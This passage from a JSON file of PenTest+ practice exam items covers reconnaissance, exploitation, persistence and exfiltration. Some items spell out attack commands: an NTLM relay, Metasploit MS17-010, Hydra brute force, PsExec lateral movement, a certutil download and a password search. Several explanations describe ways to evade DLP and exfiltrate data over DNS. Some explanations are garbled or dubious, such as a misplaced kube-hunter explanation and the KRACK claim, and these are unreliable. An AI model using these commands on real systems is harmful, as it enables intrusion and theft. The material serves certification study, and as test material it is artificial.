      "explanation": "To break the key for a Wi-Fi network that uses WPA2 encryption, the penetration tester should use the \nKRACK (Key Reinstallation Attack) attack.\n\nKRACK (Key Reinstallation Attack):\n\nDefinition: KRACK is a vulnerability in the WPA2 protocol that allows attackers to decrypt and \npotentially inject packets into a Wi-Fi network by manipulating and replaying cryptographic \nhandshake messages.\n\nImpact: This attack exploits flaws in the WPA2 handshake process, allowing an attacker to break \nthe encryption and gain access to the network.\n\nOther Attacks:\n\nChopChop: Targets WEP encryption, not WPA2.\n\nReplay: Involves capturing and replaying packets to create effects such as duplicating \ntransactions; it does not break WPA2 encryption.\n\nInitialization Vector (IV): Related to weaknesses in WEP, not WPA2.\n\nPentest References:\n\nWireless Security: Understanding vulnerabilities in Wi-Fi encryption protocols, such as WPA2, and \nhow they can be exploited.\n\nKRACK Attack: A significant vulnerability in WPA2 that requires specific techniques to exploit.\n\nBy using the KRACK attack, the penetration tester can break WPA2 encryption and gain unauthorized access \nto the Wi-Fi network.\nTop of Form\nBottom of Form\n=================",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 183,
      "question_text": "During a testing engagement, a penetration tester compromises a host and locates data for exfiltration. Which of the following are the best options to move the data without triggering a data loss prevention tool? (Select two).",
      "options": {
        "A": "Move the data using a USB flash drive.",
        "B": "Compress and encrypt the data.",
        "C": "Rename the file name extensions.",
        "D": "Use FTP for exfiltration.",
        "E": "Encode the data as Base64.",
        "F": "Send the data to a commonly trusted service."
      },
      "correct_answer": "B E",
      "explanation": "Data Loss Prevention (DLP) tools monitor sensitive data and prevent unauthorized exfiltration. The two best \noptions to bypass DLP are:\n\nCompress and encrypt the data (Option B):\n\nCompression reduces file size, making detection harder. Encryption further protects the data by \nmaking it unreadable without a key.\n\nDLP tools often inspect content based on known patterns (e.g., credit card numbers, sensitive \nkeywords). Encrypted files bypass content inspection since DLP cannot analyze encrypted data.\n\nEncode the data as Base64 (Option E):\n\nEncoding transforms data into a format that might bypass simple pattern matching used by some DLP tools. While more sophisticated DLP might detect Base64, it can be effective against basic checks, especially when combined with other evasion techniques (like tunneling over allowed protocols).",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_multiple_answer"
    },
    {
      "question_number": 125,
      "question_text": "A penetration tester is developing the rules of engagement for a potential client. Which of the following would most likely be a function of the rules of engagement?",
      "options": {
        "A": "Testing window",
        "B": "Terms of service",
        "C": "Authorization letter",
        "D": "Shared responsibilities"
      },
      "correct_answer": "A",
      "explanation": "The rules of engagement define the scope, limitations, and conditions under which a penetration test is \nconducted. Here’s why option A is correct:\n\nTesting Window: This specifies the time frame during which the penetration testing activities are \nauthorized to occur. It is a crucial part of the rules of engagement to ensure the testing does not disrupt \nbusiness operations and is conducted within agreed-upon hours.\n\nTerms of Service: This generally refers to the legal agreement between a service provider and user, not \nspecific to penetration testing engagements.\n\nAuthorization Letter: This provides formal permission for the penetration tester to perform the \nassessment but is not a component of the rules of engagement.\n\nShared Responsibilities: This refers to the division of security responsibilities between parties, often \nseen in cloud service agreements, but not specifically a function of the rules of engagement.\n\nReferences from Pentest:\n\nLuke HTB: Highlights the importance of clearly defining the testing window in the rules of engagement \nto ensure all parties are aligned.\n\nForge HTB: Demonstrates the significance of having a well-defined testing window to avoid \ndisruptions and ensure compliance during the assessment.",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 120,
      "question_text": "A penetration tester successfully gained access to manage resources and services within the company's cloud environment. This was achieved by exploiting poorly secured administrative credentials that had extensive permissions across the network. Which of the following credentials was the tester able to obtain?",
      "options": {
        "A": "IAM credentials",
        "B": "SSH key for cloud instance",
        "C": "Cloud storage credentials",
        "D": "Temporary security credentials (STS)"
      },
      "correct_answer": "A",
      "explanation": "IAM (Identity and Access Management) credentials are used to control and manage access to cloud services \nand resources. When a penetration tester obtains IAM credentials, especially those with administrative \nprivileges, they can perform high-level operations such as provisioning services, modifying configurations, or \naccessing sensitive data across the cloud environment.\n\nSSH keys would only grant access to a specific instance, not cloud-wide services.\n\nCloud storage credentials are limited to storage access, not administrative capabilities.\n\nTemporary security credentials (STS) provide limited-time access and are not typically used for broad \nadministrative tasks.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 121,
      "question_text": "A penetration tester gains access to a Windows machine and wants to further enumerate users with native operating system credentials. Which of the following should the tester use?",
      "options": {
        "A": "route.exe print",
        "B": "netstat.exe -ntp",
        "C": "net.exe commands",
        "D": "strings.exe -a"
      },
      "correct_answer": "C",
      "explanation": "To further enumerate users on a Windows machine using native operating system commands, the tester \nshould use net.exe commands. The net command is a versatile tool that provides various network \nfunctionalities, including user enumeration.\n\nnet.exe:\n\nnet user: This command displays a list of user accounts on the local machine.\n\nnet localgroup: This command lists all local groups, and by specifying a group name, it can list \nthe members of that group.\n\nnet localgroup administrators\n\nEnumerating Users:\n\nList All Users: The net user command provides a comprehensive list of all user accounts \nconfigured on the system.\n\nGroup Memberships: The net localgroup command can be used to see which users belong to \nspecific groups, such as administrators.\n\nPentest References:\n\nPost-Exploitation: After gaining initial access, enumerating user accounts helps understand the \nstructure and potential targets for privilege escalation.\n\nWindows Commands: Leveraging built-in commands like net for enumeration ensures that no \nadditional tools need to be uploaded to the target system, reducing the risk of detection.\n\nUsing net.exe commands, the penetration tester can effectively enumerate user accounts and group \nmemberships on the compromised Windows machine, aiding in further exploitation and privilege escalation.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 123,
      "question_text": "A penetration tester is performing a cloud-based penetration test against a company. Stakeholders have indicated the priority is to see if the tester can get into privileged systems that are not directly accessible from the internet. Given the following scanner information:\nServer-side request forgery (SSRF) vulnerability in test.comptia.org\nReflected cross-site scripting (XSS) vulnerability in test2.comptia.org\nPublicly accessible storage system named static_comptia_assets\nSSH port 22 open to the internet on test3.comptia.org\nOpen redirect vulnerability in test4.comptia.org\nWhich of the following attack paths should the tester prioritize first?",
      "options": {
        "A": "Synchronize all the information from the public bucket and scan it with Trufflehog.",
        "B": "Run Pacu to enumerate permissions and roles within the cloud-based systems.",
        "C": "Perform a full dictionary brute-force attack against the open SSH service using Hydra.",
        "D": "Use the reflected cross-site scripting attack within a phishing campaign to attack administrators.",
        "E": "Leverage the SSRF to gain access to credentials from the metadata service."
      },
      "correct_answer": "E",
      "explanation": "Leverage SSRF for Metadata Access:\n\nServer-side request forgery (SSRF) vulnerabilities allow attackers to force a server to send \nrequests to internal resources. In cloud environments, SSRF can often be used to access the \nmetadata service (e.g., AWS EC2 metadata) to retrieve credentials for cloud services.\n\nOnce credentials are obtained, they can be used to access privileged systems that are not directly \naccessible from the internet.\n\nWhy Not Other Options?\n\nA (Public bucket): Analyzing the bucket for sensitive data is useful but does not directly lead to \nprivileged system access.\n\nB (Pacu): Pacu is used for AWS exploitation but requires credentials or misconfigured roles. \nSSRF can provide the credentials needed to run Pacu effectively.\n\nC (SSH brute force): Brute-forcing SSH is noisy and inefficient. Privileged systems are likely \nbetter protected than SSH open to the internet.\n\nD (Phishing via XSS): This is a longer-term attack and less direct compared to leveraging SSRF.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nSSRF Exploitation and Cloud Metadata Access Techniques",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 154,
      "question_text": "A tester compromises a target host and then wants to maintain persistent access. Which of the following is the best way for the attacker to accomplish the objective?",
      "options": {
        "A": "Configure and register a service.",
        "B": "Install and run remote desktop software.",
        "C": "Set up a script to be run when users log in.",
        "D": "Perform a kerberoasting attack on the host."
      },
      "correct_answer": "A",
      "explanation": "Configuring and Registering a Service:\n\nRegistering a malicious service ensures that it starts automatically with the system, providing \npersistence even after reboots.\n\nThis method is stealthier than others and is commonly used in advanced persistent threat (APT) \nscenarios.\n\nWhy Not Other Options?\n\nB (Remote desktop software): Installing such software is noisy and can easily be detected by \nmonitoring tools.\n\nC (User logon script): While it provides persistence, it is less reliable and more detectable than a \nsystem service.\n\nD (Kerberoasting): This is a credential-stealing technique and does not establish persistence.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nDomain 4.0 (Penetration Testing Tools)",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
      {
        "question_number": 224,
        "question_text": "While performing a penetration testing exercise, a tester executes the following command:\nbash\nCopy code\nPS c:\\tools> c:\\hacks\\PsExec.exe \\\\server01.comptia.org -accepteula cmd.exe\nWhich of the following best explains what the tester is trying to do?",
        "options": {
          "A": "Test connectivity using PSExec on the server01 using CMD.exe.",
          "B": "Perform a lateral movement attack using PsExec.",
          "C": "Send the PsExec binary file to the server01 using CMD.exe.",
          "D": "Enable CMD.exe on the server01 through PsExec."
        },
        "correct_answer": "B",
        "explanation": "Lateral Movement with PsExec:\n\nPsExec is a tool used for executing processes on remote systems.\n\nThe command enables the tester to execute cmd.exe on the target host (server01) to achieve \nlateral movement and potentially escalate privileges.\n\nWhy Not Other Options?\n\nA: The command is not testing connectivity; it is executing a remote command.\n\nC: PsExec does not send its binary; it executes commands on remote systems.\n\nD: The command is not enabling cmd.exe; it is using it as a tool for executing commands \nremotely.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 180,
        "question_text": "A tester obtains access to an endpoint subnet and wants to move laterally in the network. Given the following output:\nkotlin\nCopy code\nNmap scan report for some_host\nHost is up (0.01 latency).\nPORT STATE SERVICE\n445/tcp open microsoft-ds\nHost script results: smb2-security-mode: Message signing disabled\nWhich of the following command and attack methods is the most appropriate for reducing the chances of being detected?",
        "options": {
          "A": "responder -T eth0 -dwv ntlmrelayx.py -smb2support -tf <target>",
          "B": "msf > use exploit/windows/smb/ms17_010_psexec msf > <set options> msf > run",
          "C": "hydra -L administrator -P /path/to/passwdlist smb://<target>",
          "D": "nmap —script smb-brute.nse -p 445 <target>"
        },
        "correct_answer": "A",
        "explanation": "Explanation of the Correct Option:\n\nA (responder and ntlmrelayx.py):\n\nResponder is a tool for intercepting and relaying NTLM authentication requests.\n\nSince SMB signing is disabled, ntlmrelayx.py can relay authentication requests and \nescalate privileges to move laterally without directly brute-forcing credentials, which is \nstealthier.\n\nWhy Not Other Options?\n\nB: Exploiting MS17-010 (psexec) is noisy and likely to trigger alerts.\n\nC: Brute-forcing credentials with Hydra is highly detectable due to the volume of failed login \nattempts.\n\nD: Nmap scripts like smb-brute.nse are useful for enumeration but involve brute-force methods \nthat increase detection risk.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 97,
        "question_text": "A client recently hired a penetration testing firm to conduct an assessment of their consumer-facing web application. Several days into the assessment, the client's networking team observes a substantial increase in DNS traffic. Which of the following would most likely explain the increase in DNS traffic?",
        "options": {
          "A": "Covert data exfiltration",
          "B": "URL spidering",
          "C": "HTML scrapping",
          "D": "DoS attack"
        },
        "correct_answer": "A",
        "explanation": "Covert Data Exfiltration:\n\nDNS traffic can be leveraged for covert data exfiltration because it is often allowed through \nfirewalls and not heavily monitored.\n\nTools or techniques for DNS tunneling encode sensitive information into DNS queries or \nresponses, resulting in an observable increase in DNS traffic.\n\nWhy Not Other Options?\n\nB (URL spidering): This increases HTTP traffic, not DNS traffic.\n\nC (HTML scrapping): Involves downloading website content, which primarily uses HTTP or \nHTTPS.\n\nD (DoS attack): A DNS-based DoS attack would likely involve query floods from many sources, \nnot necessarily related to the observed behavior in a penetration test.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nCovert Communication Techniques and DNS Tunneling",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 215,
        "question_text": "A penetration tester needs to use the native binaries on a system in order to download a file from the internet and evade detection. Which of the following tools would the tester most likely use?",
        "options": {
          "A": "netsh.exe",
          "B": "certutil.exe",
          "C": "nc.exe",
          "D": "cmdkey.exe"
        },
        "correct_answer": "B",
        "explanation": "Certutil.exe for File Downloads:\n\ncertutil.exe is a native Windows utility primarily used for managing certificates but can also be \nleveraged to download files from the internet.\n\nExample command:\nbash\nCopy code\ncertutil.exe -urlcache -split -f http://example.com/file.exe file.exe\n\nIts native status helps it evade detection by security tools.\n\nWhy Not Other Options?\n\nA (netsh.exe): Used for network configuration but not for downloading files.\n\nC (nc.exe): Netcat is not native to Windows and would need to be introduced to the system.\n\nD (cmdkey.exe): Used for managing stored credentials, not downloading files.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 140,
        "question_text": "Which of the following explains the reason a tester would opt to use DREAD over PTES during the planning phase of a penetration test?",
        "options": {
          "A": "The tester is conducting a web application test.",
          "B": "The tester is assessing a mobile application.",
          "C": "The tester is evaluating a thick client application.",
          "D": "The tester is creating a threat model."
        },
        "correct_answer": "D",
        "explanation": "DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability) is a threat modeling \nframework used to assess and prioritize risks.\n\nOption A (Web application test) #: While DREAD can be used in web security, PTES (Penetration \nTesting Execution Standard) is a better framework for conducting pentests.\n\nOption B (Mobile application test) #: PTES provides guidelines for mobile security testing, whereas \nDREAD is for threat modeling.\n\nOption C (Thick client application) #: Thick clients require specific testing methodologies, not DREAD.\n\nOption D (Creating a threat model) #: Correct.\n\nDREAD is designed for risk assessment and prioritization.\n\nPTES focuses on penetration testing execution, not threat modeling.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Threat Modeling with DREAD vs. PTES",
        "is_simulation": false,
        "domain": "1.0 Engagement Management",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 72,
        "question_text": "A penetration tester is attempting to exfiltrate sensitive data from a client environment without alerting the client's blue team. Which of the following exfiltration methods most likely remain undetected?",
        "options": {
          "A": "Cloud storage",
          "B": "Email",
          "C": "Domain Name System",
          "D": "Test storage sites"
        },
        "correct_answer": "C",
        "explanation": "The Domain Name System (DNS) is commonly used for covert exfiltration because it is an essential protocol \nin most networks and is less likely to be scrutinized compared to other methods. Here's how DNS exfiltration \nworks:\n\nMechanism:\n\nData is encoded into DNS queries or responses, such as using subdomain fields to transmit \nsensitive information.\n\nThese queries are sent to a malicious DNS server controlled by the attacker, allowing data to \nbypass traditional detection mechanisms.\n\nWhy It Remains Undetected:\n\nDNS traffic is frequently allowed and not as heavily monitored compared to other channels like \nHTTP or email.\n\nNetwork security tools often prioritize operational DNS traffic, making detection of anomalies \nmore challenging.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nDomain 5.0 (Reporting and Communication)",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 205,
        "question_text": "After a recent penetration test was conducted by the company's penetration testing team, a systems administrator notices the following in the logs:\n2/10/2023 05:50AM C:\\users\\mgranite\\schtasks /query\n2/10/2023 05:53AM C:\\users\\mgranite\\schtasks /CREATE /SC DAILY\nWhich of the following best explains the team's objective?",
        "options": {
          "A": "To enumerate current users",
          "B": "To determine the users' permissions",
          "C": "To view scheduled processes",
          "D": "To create persistence in the network"
        },
        "correct_answer": "D",
        "explanation": "The logs indicate that the penetration testing team’s objective was to create persistence in the network.\n\nLog Analysis:\n\nschtasks /query: This command lists all the scheduled tasks on the system. It is often used to \nunderstand what tasks are currently scheduled and running.\n\nschtasks /CREATE /SC DAILY: This command creates a new scheduled task that runs daily. \nCreating such a task can be used to ensure that a script or program runs regularly, maintaining a \nfoothold in the system.\n\nPersistence:\n\nDefinition: Persistence refers to techniques used to maintain access to a compromised system \neven after reboots or other interruptions.\n\nScheduled Tasks: One common method of achieving persistence on Windows systems is by \ncreating scheduled tasks that execute malicious payloads or scripts at regular intervals.\n\nOther Options:\n\nEnumerate Current Users: The logs do not show commands related to user enumeration.\n\nDetermine Users' Permissions: Commands like whoami or net user would be more relevant for \nchecking user permissions.\n\nView Scheduled Processes: While schtasks /query can view scheduled tasks, the addition of the \nschtasks /CREATE command indicates the intent to create new scheduled tasks, which aligns \nwith creating persistence.\n\nPentest References:\n\nPost-Exploitation: Establishing persistence is a key objective after gaining initial access to ensure \ncontinued access.\n\nScheduled Tasks: Utilizing Windows Task Scheduler to run scripts or programs automatically at \nspecified times as a method for maintaining access.\n\nBy creating scheduled tasks, the penetration testing team aims to establish persistence, ensuring they can \nretain access to the system over time.",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 148,
        "question_text": "A tester performs a vulnerability scan and identifies several outdated libraries used within the customer SaaS product offering. Which of the following types of scans did the tester use to identify the libraries?",
        "options": {
          "A": "IAST",
          "B": "SBOM",
          "C": "DAST",
          "D": "SAST"
        },
        "correct_answer": "D",
        "explanation": "kube-hunter is a tool designed to perform security assessments on Kubernetes clusters. It identifies various vulnerabilities, focusing on weaknesses and misconfigurations. Here’s why option B is correct:\n(Note: This explanation seems incorrect for the question. The question asks about identifying outdated libraries, which is typically done by SAST or SCA, not related to Kubernetes/kube-hunter. Assuming the intended context relates to software dependencies...)\n\nExplanation (Revised for library scanning context):\n\nSAST (Static Application Security Testing): Analyzes source code or compiled binaries without execution. Can identify the use of known vulnerable library versions by analyzing dependency declarations or manifest files.\n\nSCA (Software Composition Analysis): Specifically designed to identify open-source components and their known vulnerabilities within an application. Often integrated with SAST or build processes.\n\nIAST (Interactive Application Security Testing): Analyzes the application during runtime execution, often combining aspects of SAST and DAST.\n\nDAST (Dynamic Application Security Testing): Tests the running application from the outside, typically doesn't identify specific library versions unless they cause observable vulnerabilities.\n\nSBOM (Software Bill of Materials): A list of components in software, often generated by SCA or SAST tools, but not a scan type itself.\n\nGiven the options, SAST (D) is a plausible method for identifying outdated libraries by analyzing code/binaries, although SCA would be more specific.",
        "is_simulation": false,
        "domain": "3.0 Vulnerability Discovery and Analysis",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 144,
        "question_text": "Which of the following techniques is the best way to avoid detection by Data Loss Prevention (DLP) tools?",
        "options": {
          "A": "Encoding",
          "B": "Compression",
          "C": "Encryption",
          "D": "Obfuscation"
        },
        "correct_answer": "C",
        "explanation": "Data Loss Prevention (DLP) tools monitor network traffic and files for sensitive information leaks. The most \neffective way to bypass DLP is to use encryption, since DLP systems cannot inspect encrypted content.\n\nOption A (Encoding) #: Base64 or Hex encoding can sometimes bypass filters, but many DLP tools \ndetect common encoding schemes.\n\nOption B (Compression) #: Compression can change file signatures, but modern DLP systems can \ninspect compressed files.\n\nOption C (Encryption) #: Correct.\n\nStrong encryption prevents DLP tools from analyzing file contents.\n\nOption D (Obfuscation) #: Code obfuscation may work for source code leaks, but DLP solutions use \nheuristics to detect patterns.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Bypassing Security Controls",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 46,
        "question_text": "During an external penetration test, a tester receives the following output from a tool:\ntest.comptia.org\ninfo.comptia.org\nvpn.comptia.org\nexam.comptia.org\nWhich of the following commands did the tester most likely run to get these results?",
        "options": {
          "A": "nslookup -type=SOA comptia.org",
          "B": "amass enum -passive -d comptia.org",
          "C": "nmap -Pn -sV -vv -A comptia.org",
          "D": "shodan host comptia.org"
        },
        "correct_answer": "B",
        "explanation": "The tool and command provided by option B are used to perform passive DNS enumeration, which can \nuncover subdomains associated with a domain. Here’s why option B is correct:\n\namass enum -passive -d comptia.org: This command uses the Amass tool to perform passive DNS \nenumeration, effectively identifying subdomains of the target domain. The output provided \n(subdomains) matches what this tool and command would produce.\n\nnslookup -type=SOA comptia.org: This command retrieves the Start of Authority (SOA) record, which \ndoes not list subdomains.\n\nnmap -Pn -sV -vv -A comptia.org: This Nmap command performs service detection and aggressive \nscanning but does not enumerate subdomains.\n\nshodan host comptia.org: Shodan is an internet search engine for connected devices, but it does not \nperform DNS enumeration to list subdomains.\n\nReferences from Pentest:\n\nWriteup HTB: Demonstrates the use of DNS enumeration tools like Amass to uncover subdomains \nduring external assessments.\n\nHorizontall HTB: Highlights the effectiveness of passive DNS enumeration in identifying subdomains \nand associated information.",
        "is_simulation": false,
        "domain": "2.0 Reconnaissance and Enumeration",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 60,
        "question_text": "A penetration testing team wants to conduct DNS lookups for a set of targets provided by the client. The team crafts a Bash script for this task. However, they find a minor error in one line of the script:\n1 #!/bin/bash\n2 for i in $(cat example.txt); do\n3 curl $i\n4 done\nWhich of the following changes should the team make to line 3 of the script?",
        "options": {
          "A": "resolvconf $i",
          "B": "rndc $i",
          "C": "systemd-resolve $i",
          "D": "host $i"
        },
        "correct_answer": "D",
        "explanation": "Script Analysis:\n\nLine 1: #!/bin/bash - This line specifies the script should be executed in the Bash shell.\n\nLine 2: for i in $(cat example.txt); do - This line starts a loop that reads each line from the file \nexample.txt and assigns it to the variable i.\n\nLine 3: curl $i - This line attempts to fetch the content from the URL stored in i using curl. \nHowever, for DNS lookups, curl is inappropriate.\n\nLine 4: done - This line ends the loop.\n\nError Identification:\n\nThe curl command is used for transferring data from or to a server, often used for HTTP requests, \nwhich is not suitable for DNS lookups.\n\nCorrect Command:\n\nTo perform DNS lookups, the host command should be used. The host command performs DNS \nlookups and displays information about the given domain.\n\nCorrected Script:\n\nReplace curl $i with host $i to perform DNS lookups on each target specified in example.txt.\n\nPentest References:\n\nIn penetration testing, DNS enumeration is a crucial step. It involves querying DNS servers to gather \ninformation about the target domain, which includes resolving domain names to IP addresses and vice \nversa.\n\nCommon tools for DNS enumeration include host, dig, and nslookup. The host command is particularly \nstraightforward for simple DNS lookups.\n\nBy correcting the script to use host $i, the penetration testing team can effectively perform DNS lookups on \nthe targets specified in example.txt.",
        "is_simulation": false,
        "domain": "2.0 Reconnaissance and Enumeration",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 61,
        "question_text": "During a penetration test, the tester gains full access to the application's source code. The application repository includes thousands of code files. Given that the assessment timeline is very short, which of the following approaches would allow the tester to identify hard-coded credentials most effectively?",
        "options": {
          "A": "Run TruffleHog against a local clone of the application",
          "B": "Scan the live web application using Nikto",
          "C": "Perform a manual code review of the Git repository",
          "D": "Use SCA software to scan the application source code"
        },
        "correct_answer": "A",
        "explanation": "Given a short assessment timeline and the need to identify hard-coded credentials in a large codebase, using \nan automated tool designed for this specific purpose is the most effective approach. Here’s an explanation of \neach option:\n\nRun TruffleHog against a local clone of the application (Answer: A):\n\nExplanation: TruffleHog is a specialized tool that scans for hard-coded secrets such as passwords, \nAPI keys, and other sensitive data within the code repositories.\n\nEffectiveness: It quickly and automatically identifies potential credentials and other sensitive \ninformation across thousands of files, making it the most efficient choice under time constraints.",
        "is_simulation": false,
        "domain": "3.0 Vulnerability Discovery and Analysis",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 190,
        "question_text": "During host discovery, a security analyst wants to obtain GeoIP information and a comprehensive summary of exposed services. Which of the following tools is best for this task?",
        "options": {
          "A": "WiGLE.net",
          "B": "WHOIS",
          "C": "theHarvester",
          "D": "Censys.io"
        },
        "correct_answer": "D",
        "explanation": "Censys.io is a powerful reconnaissance tool that scans the internet and provides detailed information about \nexposed services, certificates, and GeoIP data.\n\nOption A (WiGLE.net) #: Used for wireless network mapping, not host discovery.\n\nOption B (WHOIS) #: Provides domain registration information, not GeoIP or service summaries.\n\nOption C (theHarvester) #: Used for OSINT, mainly to collect emails, subdomains, and usernames.\n\nOption D (Censys.io) #: Correct. Censys provides:\n\nGeoIP data (location of hosts).\n\nExposed services and open ports.\n\nTLS certificate analysis.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Reconnaissance and OSINT Tools",
        "is_simulation": false,
        "domain": "2.0 Reconnaissance and Enumeration",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 110,
        "question_text": "Which of the following components should a penetration tester include in the final assessment report?",
        "options": {
          "A": "User activities",
          "B": "Customer remediation plan",
          "C": "Key management",
          "D": "Attack narrative"
        },
        "correct_answer": "D",
        "explanation": "The attack narrative is a critical part of the report that tells the story of how the tester exploited vulnerabilities, \ngained access, and moved laterally. It helps stakeholders understand the real-world impact in a readable and \nlogical sequence.\n\nUser activities are more operational logs than part of a pentest report.\n\nCustomer remediation plan is the client’s responsibility.\n\nKey management might be discussed but is not a required component of the report.",
        "is_simulation": false,
        "domain": "1.0 Engagement Management",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 6,
        "question_text": "Which of the following elements of a penetration test report can be used to most effectively prioritize the remediation efforts for all the findings?",
        "options": {
          "A": "Methodology",
          "B": "Detailed findings list",
          "C": "Risk score",
          "D": "Executive summary"
        },
        "correct_answer": "C",
        "explanation": "Risk scores quantify the severity and likelihood of exploitation for each finding. This helps organizations \nprioritize which vulnerabilities to remediate first based on potential impact and exploitability.\n\nMethodology outlines how the test was performed.\n\nFindings list shows issues, but without prioritization.\n\nExecutive summary provides a high-level overview for decision-makers, not technical prioritization.",
        "is_simulation": false,
        "domain": "1.0 Engagement Management",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 117,
        "question_text": "A penetration tester writes the following script to enumerate a 1724 network:\n1 #!/bin/bash\n2 for i in {1..254}; do\n3 ping -c1 192.168.1.$i\n4 done\nThe tester executes the script, but it fails with the following error:\n-bash: syntax error near unexpected token `ping'\nWhich of the following should the tester do to fix the error?",
        "options": {
          "A": "Add do after line 2.",
          "B": "Replace {1..254} with $(seq 1 254).",
          "C": "Replace bash with tsh.",
          "D": "Replace $i with ${i}."
        },
        "correct_answer": "A",
        "explanation": "The error in the script is due to a missing do keyword in the for loop. Here’s the corrected script and \nexplanation:\n\nOriginal Script:\n\n1 #!/bin/bash\n2 for i in {1..254};\n3 ping -c1 192.168.1.$i\n4 done\n\nError Explanation:\n\nThe for loop syntax in Bash requires the do keyword to indicate the start of the loop's body.\n\nCorrected Script:\n\n1 #!/bin/bash\n2 for i in {1..254}; do\n3 ping -c1 192.168.1.$i\n4 done\n\nAdding do after line 2 corrects the syntax error and allows the script to execute properly.",
        "is_simulation": false,
        "domain": "3.0 Vulnerability Discovery and Analysis",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 86,
        "question_text": "During a security assessment, a penetration tester needs to exploit a vulnerability in a wireless network's authentication mechanism to gain unauthorized access to the network. Which of the following attacks would the tester most likely perform to gain access?",
        "options": {
          "A": "KARMA attack",
          "B": "Beacon flooding",
          "C": "MAC address spoofing",
          "D": "Eavesdropping"
        },
        "correct_answer": "C",
        "explanation": "MAC address spoofing involves changing the MAC address of a network interface to mimic another device \non the network. This technique is often used to bypass network access controls and gain unauthorized access \nto a network.\n\nUnderstanding MAC Address Spoofing:\n\nMAC Address: A unique identifier assigned to network interfaces for communication on the \nphysical network segment.\n\nSpoofing: Changing the MAC address to a different one, typically that of an authorized device, to \ngain access to restricted networks.\n\nPurpose:\n\nBypassing Access Controls: Gain access to networks that use MAC address filtering as a security \nmeasure.\n\nImpersonation: Assume the identity of another device on the network to intercept traffic or access \nnetwork resources.\n\nTools and Techniques:\n\nLinux Command: Use the ifconfig or ip command to change the MAC address.\nStep-by-Step Explanationifconfig eth0 hw ether 00:11:22:33:44:55\n\nTools: Tools like macchanger can automate the process of changing MAC addresses.\n\nImpact:\n\nNetwork Access: Gain unauthorized access to networks and network resources.\n\nInterception: Capture traffic intended for another device, potentially leading to data theft or \nfurther exploitation.\n\nDetection and Mitigation:\n\nMonitoring: Use network monitoring tools to detect changes in MAC addresses.\n\nSecure Configuration: Implement port security on switches to restrict which MAC addresses can \nconnect to specific ports.\n\nReferences from Pentesting Literature:\n\nMAC address spoofing is a common technique discussed in wireless and network security \nchapters of penetration testing guides.\n\nHTB write-ups often include examples of using MAC address spoofing to bypass network access \ncontrols and gain unauthorized access.",
        "is_simulation": false,
        "domain": "4.0 Attacks and Exploits",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 129,
        "question_text": "During an assessment, a penetration tester gains a low-privilege shell and then runs the following command:\nfindstr /SIM /C:\"pass\" *.txt *.cfg *.xml\nWhich of the following is the penetration tester trying to enumerate?",
        "options": {
          "A": "Configuration files",
          "B": "Permissions",
          "C": "Virtual hosts",
          "D": "Secrets"
        },
        "correct_answer": "D",
        "explanation": "The command searches for the keyword \"pass\" (passwords) across all .txt, .cfg, and .xml files, which are \ncommon locations for stored credentials.\n\nOption A (Configuration files) #: While .cfg files may contain settings, the search is specifically for \nsecrets (passwords).\n\nOption B (Permissions) #: The command does not list permissions.\n\nOption C (Virtual hosts) #: This does not relate to virtual host enumeration.\n\nOption D (Secrets) #: Correct. The tester is looking for stored passwords or sensitive data.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Privilege Escalation Techniques",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
